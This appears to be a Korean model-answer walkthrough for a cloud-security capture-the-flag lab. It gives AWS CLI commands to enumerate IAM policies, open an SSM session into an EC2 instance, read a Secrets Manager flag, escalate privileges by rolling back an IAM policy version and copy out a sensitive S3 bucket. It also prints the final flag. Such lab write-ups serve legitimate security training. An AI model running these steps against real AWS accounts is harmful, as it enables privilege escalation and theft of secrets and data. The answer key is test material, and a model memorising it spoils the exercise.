# [cloud_secret_exfil] 모범 답안

## Easy Route
1. 최초 제공된 2개의 자격 증명 중에서 easy route의 자격 증명을 이용하여 프로파일을 등록한다.
```bash
aws configure --profile easyroute
```

2. 먼저 사용자에 대한 정보를 확인한다.
```bash
aws sts get-caller-identity --profile easyroute
```

3. 해당 사용자의 인라인 정책을 확인한다.
```bash
aws iam list-user-policies --user-name attacker-user-2 --profile easyroute
```

4. 해당 인라인 정책의 권한을 확인하여 ssm관련 권한이 있는 것을 확인한다.
```bash
aws iam get-user-policy --user-name attacker-user-2 --policy-name attacker-user-policy-2 --profile easyroute
```

5. ssm 세션을 시작하기 위해 session-manager plugin을 설치한다.
```bash
curl -o session-manager-plugin.deb https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb

sudo dpkg -i session-manager-plugin.deb

session-manager-plugin
```

6. 접속할 인스턴스의 id를 확인한다.
```bash
aws ec2 describe-instances --query "Reservations[].Instances[].InstanceId" --output text --profile easyroute
```


7. ssm 세션을 시작하여 ec2내로 접속을 한다.
```bash
aws ssm start-session --target <ec2id> --profile easyroute
```


8. SecretsManager의 비밀 목록을 확인한다.
```bash
aws secretsmanager list-secrets
```

9. Secret을 확인하여 비밀 FLAG를 획득한다.
```bash
aws secretsmanager get-secret-value --secret-id secretFLAG-OrcAHYV87Uuzb1KB
```
<br/><br/>
## Hard Route
10. v2의 정책으로 교체해준다.
```bash
aws iam set-default-policy-version --policy-arn <정책의 arn> --profile rce_server --version-id v2
```

11. S3에 접근이 가능해졌고 기밀데이터를 유출한다.
```bash
aws s3 ls

aws s3 ls s3://policy-rollback-rce-sensitive-data --profile rce_server

aws s3 sync s3://policy-rollback-rce-sensitive-data ./ --profile rce_server
```
flag.txt를 받아올 수 있다.

`flag` : FLAG{pO1iCy_rollb4CK_rcE_5uCCeS5}
